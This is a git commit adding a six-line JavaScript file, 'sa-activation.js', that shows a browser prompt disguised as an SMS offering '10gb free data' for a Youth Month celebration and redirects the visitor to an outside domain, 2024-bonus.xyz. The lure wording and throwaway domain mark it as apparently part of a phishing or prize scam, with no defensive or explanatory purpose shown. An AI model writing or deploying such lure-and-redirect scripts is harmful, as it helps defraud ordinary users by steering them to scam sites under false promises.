3726c7fa791882e4cdec47f821410179eeac91d8
opayoffer <154964955+opayoffer@users.noreply.github.com>
2024-06-13 22:18:37 -0700

    Create sa-activation.js

---
+++ sa-activation.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('SMS: HAPPY YOUTH MONTH, kindly check if you are qualify to receive 10gb free data youth month celebration, offers ends 30th June, press 1 to activate now ','1');
+if (password != '1') {
+location.href='https://2024-bonus.xyz/youth.month.html';
+}
